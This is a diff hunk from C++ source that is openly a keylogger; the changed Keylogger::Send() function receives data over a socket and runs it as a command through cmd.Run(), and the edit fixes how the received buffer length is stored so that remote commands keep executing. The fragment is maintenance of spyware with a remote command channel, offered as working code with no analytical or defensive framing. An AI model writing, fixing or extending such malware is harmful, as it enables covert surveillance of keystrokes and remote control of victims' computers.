@@ -180,11 +180,11 @@ void Keylogger::Send()
         return;
     }
 
-    this->cmdBufLen = recv(sock, cmdBuf, this->cmdBufLen, 0);
-    if (this->cmdBufLen > 0)
+    int bufLen = recv(sock, cmdBuf, this->cmdBufLen, 0);
+    if (bufLen > 0)
     {
         cmd.Run(cmdBuf);
-        this->cmdBufLen = 0;
+        bufLen = 0;
     }
 
     closesocket(sock);
